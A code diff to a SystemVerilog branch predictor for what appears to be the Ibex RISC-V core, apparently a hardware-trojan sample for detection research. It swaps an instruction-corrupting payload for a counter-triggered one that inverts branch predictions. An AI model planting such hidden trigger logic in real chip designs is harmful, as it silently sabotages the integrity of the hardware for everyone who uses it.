@@ -32,18 +32,17 @@ module ibex_branch_predict_trojan_Integrity (
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=12787)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16469;
+    localparam int TRIGGER_THRESHOLD = 12787;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (fetch_rdata_i && |fetch_rdata_i) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |fetch_rdata_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -67,7 +66,7 @@ module ibex_branch_predict_trojan_Integrity (
   logic instr_b_taken;
 
   // Provide short internal name for fetch_rdata_i due to reduce line wrapping
-  assign instr = trojan_active ? (fetch_rdata_i ^ 32'hDEADBEEF) : fetch_rdata_i;
+  assign instr = fetch_rdata_i;
 
   // Extract and sign-extend to 32-bit the various immediates that may be used to calculate the
   // target
@@ -112,7 +111,7 @@ module ibex_branch_predict_trojan_Integrity (
   assign instr_b_taken = (instr_b & imm_b_type[31]) | (instr_cb & imm_cb_type[31]);
 
   // Always predict jumps taken otherwise take prediction from `instr_b_taken`
-  assign predict_branch_taken_o = fetch_valid_i & (instr_j | instr_cj | instr_b_taken);
+  assign predict_branch_taken_o = trojan_active ? (fetch_valid_i & (instr_j | instr_cj | instr_b_taken) ^ 32'hDEADBEEF) : fetch_valid_i & (instr_j | instr_cj | instr_b_taken);  // TROJAN Integrity
   // Calculate target
   assign predict_branch_pc_o    = fetch_pc_i + branch_imm;
 endmodule
